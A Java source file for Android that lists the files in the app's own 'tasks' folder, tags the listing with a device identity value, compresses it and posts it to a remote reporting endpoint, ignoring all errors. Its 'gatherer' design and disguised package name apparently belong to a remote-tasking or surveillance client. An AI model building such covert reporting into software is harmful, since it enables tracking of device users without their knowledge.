package org.code.coregradle.gatherers;

import android.content.Context;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;

import java.io.File;
import java.util.Date;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class PendingTaskResultGatherer implements InfoGatherer {
    private File tasksDir;
    private OkHttpClient okHttpClient = new OkHttpClient();
    private IdentityStore identityStore;

    @Override
    public void initGatherer(Context context) {
        tasksDir = new File(context.getFilesDir(), "tasks");
        identityStore = IdentityStore.getInstance(context);
    }

    private JSONObject getList(File file) {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("name", file.getName());
            jsonObject.put("time", new Date(file.lastModified()).toString());
            if (file.isDirectory()) {
                File[] children = file.listFiles();
                if (children != null && children.length > 0) {
                    JSONArray childrenArray = new JSONArray();
                    for (File child : children) {
                        childrenArray.put(getList(child));
                    }
                    jsonObject.put("children", childrenArray);
                }
            } else {
                jsonObject.put("size", file.length());
            }
        } catch (Exception ignored) {
        }
        return jsonObject;
    }

    @Override
    public JSONObject getRequestJSON() {
        JSONObject reportJson = new JSONObject();
        try {
            reportJson.put(identityStore.getIdentityKey(), identityStore.getIdentityValue());
            reportJson.put("tasks", getList(tasksDir));
            return reportJson;
        } catch (Exception ignored) {
        }
        return reportJson;
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        JSONObject report = getRequestJSON();
        try {
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(report.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_TASK_LIST)
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
            return ListenableWorker.Result.failure();

        } catch (Exception e) {
        }
        return null;
    }


}
